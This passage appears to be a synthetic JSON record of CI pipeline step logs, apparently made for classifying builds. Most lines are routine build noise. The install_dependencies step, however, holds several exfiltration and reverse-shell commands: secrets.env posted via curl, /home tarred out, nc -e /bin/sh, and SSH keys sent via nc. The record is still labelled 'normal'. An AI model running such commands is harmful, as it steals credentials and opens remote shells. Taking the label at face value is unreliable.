          "[12:00:28] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Installing jest@5.9.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-7016",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (273ms)",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-5726",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Cache hit for key-4889",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-5281",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Installing react@2.7.0",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-06T12:03:17.459542",
        "finished_at": "2025-12-06T12:03:27.033617",
        "log_lines": [
          "=== Step: save_cache ===",
          "Installing eslint@2.10.0",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Installing eslint@2.9.0",
          "[12:00:28] INFO: Processing request",
          "Installing lodash@4.12.0",
          "Compiling src/utils.go...",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "\u2713 build completed",
          "Step 6/10: Building",
          "[12:00:28] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:28] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-2728",
          "\u2713 test completed",
          "  PASS: test_cache_hit (399ms)",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing lodash@3.13.0",
          "\u2713 test completed",
          "Cache hit for key-3984",
          "Step 9/10: Building",
          "Cache hit for key-3136",
          "[12:00:28] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing jest@1.12.0",
          "Compiling src/app.ts...",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Installing axios@2.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/index.js...",
          "Cache hit for key-4070",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Installing prettier@1.8.0",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Installing prettier@5.17.0",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "Installing react@2.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-2375",
          "Installing react@3.7.0",
          "[12:00:28] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-06T12:03:27.033617",
        "finished_at": "2025-12-06T12:03:33.416333",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:00:28] WARN: Deprecated API usage",
          "[12:00:28] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Step 9/10: Building",
          "  PASS: test_db_connect (315ms)",
          "Cache hit for key-7547",
          "Step 2/10: Building",
          "Step 4/10: Building",
          "Installing jest@2.6.0",
          "Step 5/10: Building",
          "  PASS: test_db_connect (204ms)",
          "Step 6/10: Building",
          "Installing express@2.3.0",
          "[12:00:28] WARN: Deprecated API usage",
          "Cache hit for key-1618",
          "Installing jest@4.12.0",
          "  PASS: test_api_health (277ms)",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing prettier@1.12.0",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:28] INFO: Processing request",
          "  PASS: test_db_connect (453ms)",
          "Cache hit for key-2976",
          "Installing lodash@2.11.0",
          "\u2713 build completed",
          "Installing express@4.9.0",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "  PASS: test_user_create (270ms)",
          "Cache hit for key-3518",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-5707",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (388ms)",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-3001",
          "Step 9/10: Building",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-06T12:03:33.416333",
        "finished_at": "2025-12-06T12:03:49.373124",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: react has known vulnerabilities",
          "Installing prettier@5.0.0",
          "[12:00:28] WARN: Deprecated API usage",
          "Cache hit for key-3787",
          "Compiling src/handler.rs...",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@2.0.0",
          "Cache hit for key-5930",
          "[12:00:28] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Cache hit for key-8227",
          "[12:00:28] WARN: Deprecated API usage",
          "Cache hit for key-6444",
          "\u2713 build completed",
          "[12:00:28] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing react@2.6.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing axios@4.20.0",
          "Step 4/10: Building",
          "Installing express@5.10.0",
          "Cache hit for key-1270",
          "\u2713 lint completed",
          "[12:00:28] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_user_create (488ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (218ms)",
          "Compiling src/utils.go...",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing eslint@4.14.0",
          "Installing express@5.6.0",
          "\u2713 lint completed",
          "Cache hit for key-5377",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-4737",
          "Cache hit for key-5546",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-06T12:03:49.373124",
        "finished_at": "2025-12-06T12:04:37.243497",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:28] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@3.10.0",
          "Cache hit for key-4655",
          "Installing eslint@3.2.0",
          "Installing webpack@5.17.0",
          "Cache hit for key-9552",
          "\u2713 build completed",
          "Sending 13MB of data to example.com",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Sending 282MB of data to example.com",
          "[12:00:28] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:28] WARN: Deprecated API usage",
          "Sending 126MB of data to startup.dev",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Sending 399MB of data to cloud.services",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "nc -e /bin/sh 87.124.199.175 33123",
          "Installing lodash@2.11.0",
          "Installing express@2.14.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u2713 build completed",
          "Sending 328MB of data to example.com",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_cache_hit (182ms)",
          "nc -e /bin/sh 45.84.224.50 17941",
          "Cache hit for key-9943",
          "Installing axios@4.20.0",
          "Step 7/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 199.27.132.129 10988",
          "  PASS: test_api_health (306ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-9409",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "FAILED: test_cache_hit",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (444ms)",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "WARNING: react has known vulnerabilities",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (156ms)",
          "Installing prettier@3.9.0",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Step 2/10: Building",
          "[12:00:28] INFO: Processing request",
          "Installing express@1.4.0",
          "Installing prettier@2.18.0",
          "Compiling src/utils.go...",
          "Installing jest@2.6.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 48.222.165.51 7660",
          "  PASS: test_cache_hit (418ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "nc -e /bin/sh 223.148.13.136 19300",
          "Cache hit for key-7066",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}